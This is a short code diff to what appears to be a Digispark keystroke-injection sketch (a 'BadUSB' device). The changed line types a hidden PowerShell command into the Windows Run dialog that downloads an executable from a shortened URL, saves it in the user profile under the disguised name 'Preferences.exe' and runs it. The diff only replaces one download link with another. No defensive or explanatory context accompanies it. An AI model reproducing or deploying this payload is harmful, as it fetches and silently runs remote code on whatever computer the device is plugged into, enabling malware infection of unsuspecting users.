@@ -208,7 +208,7 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(100);
-  DigiKeyboardFi.print("powershell -w hidden -c \"(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/yc53e7vs', \\\"$env:UserProfile/Preferences.exe\\\");Start-Process \\\"$env:UserProfile/Preferences.exe\\\" -WorkingDir \\\"$env:UserProfile/\\\"\"");
+  DigiKeyboardFi.print("powershell -w hidden -c \"(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/43y48zjx', \\\"$env:UserProfile/Preferences.exe\\\");Start-Process \\\"$env:UserProfile/Preferences.exe\\\" -WorkingDir \\\"$env:UserProfile/\\\"\"");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
   exit(0);
